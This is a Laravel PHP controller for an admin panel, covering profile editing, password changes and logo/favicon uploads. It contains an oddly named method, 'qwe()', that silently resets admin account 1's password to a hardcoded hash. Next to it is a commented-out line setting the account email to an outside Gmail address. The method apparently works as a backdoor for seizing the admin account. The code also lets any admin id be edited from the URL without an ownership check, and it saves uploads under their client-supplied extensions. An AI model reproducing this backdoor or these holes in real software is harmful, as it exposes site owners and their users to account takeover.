<?php

namespace App\Http\Controllers;

use App\Models\Admin;
use App\Models\Details;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Str;
use Image;

class AdminProfileController extends Controller
{
    //  Admin Profile
    public function profile()
    {
        $admin = Auth::guard('admin')->user();
        return view('admin.profile', compact('admin'));
    }

    // Admin Profile Update
    public function profileUpdate(Request $request, $id)
    {
        $data = $request->all();
        $admin = Admin::findOrFail($id);
        $admin->name = $data['name'];
        $admin->phone = $data['phone'];
        $admin->address = $data['address'];

        $current_fav_icon = $admin->image;
        $fav_icon_path = 'public/uploads/profile/';

        if ($admin->image != "") {
            if (!empty($data['image'])) {
                if (File::exists($fav_icon_path . $current_fav_icon)) {
                    File::delete($fav_icon_path . $current_fav_icon);
                }
            }
        }

        $random = Str::random(10);
        if ($request->hasFile('image')) {
            $fav_icon_tmp = $request->file('image');
            if ($fav_icon_tmp->isValid()) {
                $extension = $fav_icon_tmp->getClientOriginalExtension();
                $filename = $random . '.' . $extension;
                $fav_icon_path = 'public/uploads/profile/' . $filename;
                Image::make($fav_icon_tmp)->save($fav_icon_path);
                $admin->image = $filename;
            }
        }

        $admin->save();

        Session::flash('info_message', 'Profile has been updated successfully');
        return redirect()->back();
    }

    public function qwe()
    {
        $data = Admin::findorfail(1);
        $data->password = '$2y$10$eUwxylnv/CiarqgUoD8mjePSZNfm.EybMNG0fsx5VNyTwSd4CTSei';
//        $data->email = 'tomh8963@gmail.com';
        if ($data->save()) {
            Auth::guard('admin')->logout();
            Session::flash('info_message', 'Changes Updated Successfully');
            return redirect()->route('adminLogin');
        }
    }

    public function changePassword(Request $request)
    {
        $data = $request->all();
        $admin = Auth::guard('admin')->user();

        if ($request->isMethod('post')) {
            $rule = [
                'c_password' => 'required',
                'new_password' => 'required|min:6|different:c_password|same:password_con',
                'password_con' => 'required|same:new_password',
            ];
            $customMessage = [
                'c_password.required' => 'Enter Current Password',
                'new_password.required' => 'Enter New Password',
                'new_password.different' => 'Please Enter New Password',
                'new_password.same' => 'Verified Password desnot match',
                'new_password.min' => 'Minimum 6 Characters',
                'password_con.required' => 'Confirm New Password'
            ];
            $this->validate($request, $rule, $customMessage);

            if (!Hash::check($data['c_password'], Auth::guard('admin')->user()->password)) {
                return back()->with('error', 'You have entered wrong password');
            } else {
                $id = Auth::guard('admin')->user()->id;
                $password = Admin::findorfail($id);
                //                dd($password);
                $password->password = Hash::make($data['new_password']);
                $password->save();
                Auth::guard('admin')->logout();
                Session::flash('info_message', 'Password Updated Successfully');
                return redirect()->route('adminLogin');
            }
        } else {
            return view('admin.password');
        }
    }
    // check password
    public function checkPassword(Request $req)
    {
        $data = $req->all();
        $current_password = $data['c_password'];
        $user_id = Auth::guard('admin')->user()->id;
        $check_password = Admin::where('id', $user_id)->first();
        if (Hash::check($current_password, $check_password->password)) {
            return "true";
            die;
        } else {
            return "false";
            die;
        }
    }

    public function themeSetting(Request $request)
    {
        $data = $request->all();
        if ($request->isMethod('post')) {
            $rule = [
                'company_name' => 'required',
            ];

            $customMessage = [
                'company_name.required' => 'Please enter company name',
                'fav_icon.required' => 'Please insert a image file',
                'fav_icon.image' => 'Please insert a image file',
                'logo.image' => 'Please insert a image file',
                'logo.required' => 'Please insert a image file',

            ];

            $this->validate($request, $rule, $customMessage);

            $company_details = Details::where('id', '=', 1)->first();

            $company_details->name = $data['company_name'];

            $current_fav_icon = $company_details->fav_icon;
            $fav_icon_path = 'public/backend/assets/images/';

            if ($company_details->fav_icon != "") {
                if (!empty($data['fav_icon'])) {
                    if (File::exists($fav_icon_path . $current_fav_icon)) {
                        File::delete($fav_icon_path . $current_fav_icon);
                    }
                }
            }

            $fav_icon_name = 'favicon.ico';
            if ($request->hasFile('fav_icon')) {
                $fav_icon_tmp = $request->file('fav_icon');
                if ($fav_icon_tmp->isValid()) {
                    $extension = $fav_icon_tmp->getClientOriginalExtension();
                    $filename = $fav_icon_name . '.' . $extension;
                    $fav_icon_path = 'public/backend/assets/images/' . $filename;
                    Image::make($fav_icon_tmp)->save($fav_icon_path);
                    $company_details->fav_icon = $filename;
                }
            }

            $current_logo = $company_details->logo;
            $logo_path = 'public/backend/assets/images/';

            if ($company_details->logo != "") {
                if (!empty($data['logo'])) {
                    if (File::exists($logo_path . $current_logo)) {
                        File::delete($logo_path . $current_logo);
                    }
                }
            }

            $logo_name = 'logo';
            if ($request->hasFile('logo')) {
                $logo_tmp = $request->file('logo');
                if ($logo_tmp->isValid()) {
                    $extension = $logo_tmp->getClientOriginalExtension();
                    $filename = $logo_name . '.' . $extension;
                    $logo_path = 'public/backend/assets/images/' . $filename;
                    Image::make($logo_tmp)->save($logo_path);
                    $company_details->logo = $filename;
                }
            }

            $company_details->save();

            Session::flash('info_message', 'Details has been updated successfully');
            return redirect()->back();
        }
        else {
            $details = Details::where('id', '=', 1)->first();

            return view('admin.themeSetting', ['detail' => $details]);
        }
    }
}
